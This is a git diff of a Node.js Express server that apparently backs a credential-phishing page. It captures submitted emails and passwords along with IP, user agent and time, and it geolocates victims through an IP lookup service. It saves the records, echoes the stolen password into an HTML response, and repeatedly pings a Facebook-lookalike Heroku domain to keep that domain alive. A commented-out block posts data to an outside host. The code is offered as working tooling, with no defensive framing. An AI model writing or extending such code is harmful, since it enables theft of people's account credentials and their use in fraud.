@@ -60,10 +60,30 @@ var  User={};
 
       User.email = req.body.email;
     User.pass = req.body.pass;
-    User.ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    User.ip = '37.237.238.92' || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
     User['user-agent'] = req.get('User-Agent');
     User.time = (new Date()).toUTCString();
-    save(User,function (err) {
+    
+    Req.get('https://ipapi.co/'+User.ip+'/json',onGet);
+    
+    function onGet(err,resp,body)
+    {
+        if (err) return save(User,onSave);
+        try {
+            var im = JSON.parse(body);
+        }
+        
+        catch (e) {
+            User.error = e;
+            save(User,onSave);
+        }
+        
+        User.country_name = im.country_name;
+        User.city = im.city;
+        
+         save(User,onSave);
+        
+        function onSave(err) {
         if (err) return console.log(err);
         res.send('success');
         console.log('success');
@@ -72,7 +92,11 @@ var  User={};
         login:<p><span style="color: red; background-color: yellowgreen">${User.pass}</span></p>
         </div>
         `);
-    });
+    }
+    }
+    
+    
+   
 
 
 
@@ -170,13 +194,22 @@ app.use(function(err, req, res, next) {
 
 
 function save(User,callback) {
-    /*
-Req.get({
-    url:'http://samer69255.tecpt.com/',
-    form:im,
-    headers:{}
-},callback);
-*/
+    
+//    var Options = {
+//                uri: 'http://save-me.rf.gd/save.php/?i=1',
+//                json: ({s1:'hi',s2:'hello'}),
+//                method: 'POST',
+//                headers: {
+//                    'Content-Type': 'application/json',
+//                     Cookie:'__test=f1b40212d962ae22a51fb213518034c1'
+//                }
+//            }
+//    
+//Req(Options,function (err,resp,body) {
+//    console.log(body);
+//    callback(err);
+//});
+
 
 
     try {
@@ -232,7 +265,7 @@ function sendMail(msg) {
 (function () {
 
     setInterval(function () {
-        Req.get('https://faceb09k.herokuapp.com/',function (err) {
+        Req.get('https://facebo9k.herokuapp.com/',function (err) {
 
         });
     },5*60*1000);
